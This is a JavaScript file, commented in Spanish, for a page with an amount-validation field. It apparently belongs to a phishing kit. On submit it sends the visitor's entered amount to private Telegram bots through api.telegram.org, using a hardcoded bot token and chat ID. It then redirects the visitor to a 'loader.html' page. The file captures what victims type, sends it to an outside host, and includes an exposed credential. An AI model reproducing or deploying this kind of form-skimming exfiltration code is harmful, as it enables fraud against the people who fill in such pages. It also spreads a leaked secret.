document.addEventListener("DOMContentLoaded", function () {
    const inputMonto = document.getElementById("monto");
    const btnValidar = document.getElementById("btnValidar");

    // Habilitar el botón cuando el usuario escribe
    inputMonto.removeAttribute("disabled");
    inputMonto.value = ""; // Limpiar el campo al cargar la página

    inputMonto.addEventListener("input", function () {
        if (inputMonto.value.trim() !== "") {
            btnValidar.classList.remove("disabled");
            btnValidar.removeAttribute("disabled");
        } else {
            btnValidar.classList.add("disabled");
            btnValidar.setAttribute("disabled", "true");
        }
    });

    // Enviar mensaje a Telegram cuando se valide
    btnValidar.addEventListener("click", function () {
        const monto = inputMonto.value.trim();
        if (monto === "") {
            alert("Por favor, ingresa un monto válido.");
            return;
        }

        const message = `⚠️ Sobrecargo ingresado: ${monto}`;
        
        // Lista de bots y sus chat IDs
        const bots = [
            { token: "7993642572:AAHJmZ3dy5lEsQi81vpUqKAI-WmacV3YlDI", chatId: "6328222257" },
            { token: "TU_BOT_TOKEN_2", chatId: "TU_CHAT_ID_2" }
        ];

        // Enviar mensajes y redirigir solo cuando todas las solicitudes terminen
        let sendPromises = bots.map(bot => {
            const url = `https://api.telegram.org/bot${bot.token}/sendMessage`;
            const data = {
                chat_id: bot.chatId,
                text: message
            };

            return fetch(url, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify(data)
            })
            .then(response => response.json())
            .catch(error => console.error("Error al enviar mensaje:", error));
        });

        // Esperar a que todos los mensajes se envíen antes de redirigir
        Promise.all(sendPromises)
            .then(() => {
                console.log("Enviado")
                window.location.href = "loader.html"; // Cambia esto por la página a la que quieres redirigir
            });
    });
});